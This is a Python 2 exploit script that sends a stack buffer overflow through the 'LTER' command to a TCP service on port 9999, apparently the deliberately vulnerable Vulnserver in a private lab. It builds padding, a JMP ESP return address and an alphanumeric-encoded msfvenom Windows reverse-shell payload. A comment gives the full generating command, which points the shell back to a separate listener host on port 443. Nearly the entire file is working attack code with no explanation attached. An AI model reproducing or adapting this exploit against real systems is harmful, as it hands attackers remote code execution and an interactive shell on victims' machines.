import socket
import os
import sys
from subprocess import Popen,PIPE
import struct
import string

def p32(addr):
	return struct.pack("<I",addr)


def line_send_tcp(host,port,payload_list = [],recv_first=None):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,int(port)))
	if len(payload_list):
		if recv_first:
			print s.recv(1024)
		for i in payload_list:
			s.send(i)
			print s.recv(1024)
	s.close()


jmp_esp = p32(0x62501203)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.248.131 LPORT=443  BufferRegister=ESP EXITFUNC=thread -f raw|~/Desktop/exp_repo/encoders/alpha2/alpha2 ESP --uppercase 
shell = (
'TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A0'
'0ABAABTAAQ2AB2BB0BBXP8ACJJIKLJHM'
'YUPS0S03PK9M5P1N2RDLK0RVPLKPR4LL'
'KV2UDLKT2VHTONWQZ7VP1KOP1O0NLWL3'
'QSLC26LQ0O1HOTMUQXGZBJPF2PWLKPRT'
'PLKPB7L5QHPLKQPT8MU9PT4PJ5QXPV0L'
'K78TXLK6810UQXSZCWLQYLKWDLKUQIFV'
'QKOVQO0NLO1XODM5QO708M0RUL4S3CMK'
'H7K3M14SEKRQHLKF8FDUQN32FLK4LPKL'
'KPXULEQ8SLKUTLKUQXPMY1TWTWT1K1K5'
'1QIPZF1KOKP0XQOQJLKTRJKMV1M2HWCP'
'25P30CXRWT3VRQOQD3XPLD716UWKOXUN'
'XJ0UQC0UP7YYT64PPE8Q9K0RK5PKOXUP'
'P600P0P70PP1PV03XJJDOYOKPKO9ELIY'
'WSX9P98JXMS3XS2UPEQOKLIM6RJ201F6'
'72HLYOU2T3QKOHUU8E3RM3TUPLIKS1GP'
'WF7P1L6RJR21IQFKRKMSVYWQTWT7LC1S'
'1LM0DVDDPYVUP1TQD60PVQF66W61FPN6'
'6V6F3QFCXBYXLWOK6KO8ULIKP0N0VQVK'
'O00U85XMWEMSPKON5OKKPUM7ZUZ58OVL'
'UOMMMKOIE7LTFSL5ZK0KKKP2U5UOKG75'
'CRR2OSZEPPSKON5A')

payload = [
			"LTER /:./%s\n" %('A'*2003+jmp_esp+shell+'C'*(3000-2007-len(shell)))
		]

host = "192.168.248.130"
port = 9999

line_send_tcp(host,port,payload_list=payload,recv_first=True)